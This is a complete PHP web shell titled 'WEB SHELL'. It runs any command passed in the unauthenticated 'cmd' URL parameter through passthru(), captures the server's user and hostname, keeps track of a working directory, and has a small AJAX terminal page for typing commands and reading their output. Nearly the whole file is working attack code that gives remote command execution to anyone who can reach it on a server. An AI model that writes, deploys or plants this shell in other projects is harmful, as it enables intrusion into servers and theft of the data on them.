<?php session_start(); ?>
<?php

if (empty($_SESSION['path'])) {
    $_SESSION['user'] = shell_exec('whoami');
    $_SESSION['host'] = shell_exec('hostname');
    $_SESSION['path'] = dirname(__FILE__);
}
function showInfo($cmd) {
    $user = $_SESSION['user'];
    $host = $_SESSION['host'];
    $path = $_SESSION['path'];
    echo "$host:$path $$user : $cmd";
}
if (!empty($_GET['cmd'])) {
    echo "<br/>";
    $cmd =  $_GET['cmd'];
  if (ereg("cd (.*)", $cmd, $file)) {
      if ($file[1]!='.') {
          if ($file[1] == '/') {
              $path = $file[1];
          } else if ($file[1] == '..') {
              $i = strripos($_SESSION['path'], '/');
              $path = substr($_SESSION['path'], 0, $i);
              if ($i == 0 ) {
                  $_SESSION['path'] = '/';
              }
          } else{
              if ($_SESSION['path'] == '/') {
                  $path = $_SESSION['path'].$file[1];
              } else {
                  $path = $_SESSION['path'].'/'.$file[1];
              }
          }
      }
      if((file_exists($file[1]) && is_dir($file[1])) || $file[1]='~') {
          $_SESSION['path'] = $path;
          showInfo('');
      } else {
          echo "<pre>$cmd: No such file or directory</pre>";
      }
  } else {
      $path = $_SESSION['path'];
      passthru($cmd, $returnval);
      if($returnval){
          echo 'error';
      }else{  
          echo 'done';
      } 
      echo "<br/><br/>";
  }
  exit;

}
?>
<html>
  <head>
    <meta charset="UTF-8">
    <title>WEB SHELL</title>
    <style>
    body{background:#333;color:#88B541;}
    input{background:#444;color:#E19A49;border:0;width:50%;}
    .log-list{overflow-y:scroll;height:90%;}
    #text{color:#999;}
    b{color:#FB6D6C;}
    </style>
    <script>
    postCmd = function(e) {
        e.preventDefault;
        var cmd = document.getElementById('cmd'),
            log = document.getElementById('log-item'),
            text = document.getElementById('text'),
            info = document.getElementById('info'),
            ajax = new XMLHttpRequest();
        if (!cmd.value) {return;};
        ajax.open("GET", "?cmd="+cmd.value);
        ajax.send();
        ajax.onreadystatechange = function() {
            if ( ajax.readyState == 4 ) {
                if (cmd.value.match("cd ")) {
                    info.innerHTML = ajax.responseText;
                    console.log(ajax.responseText);
                    console.log(info);
                } else {
                    var t = "<pre>%s</pre>";
                    log.innerHTML += t.replace('%s', ajax.responseText);
                }
                text.scrollIntoView();
                cmd.value = "";
            }
        }
    };
    </script>
  </head>
  <body>
    <div class="log-list">
       <div id="log-item"></div>
       <span id="text">Input command here :</span>
    </div>
    <form action="javascript:;" method="post" onsubmit="postCmd(event)"/>
      <label id="info" for="cmd"><?php showInfo();?></label><input id="cmd" type="text" tab="1" autofocus="autofocus"/>
    </form>
  </body>
</html>
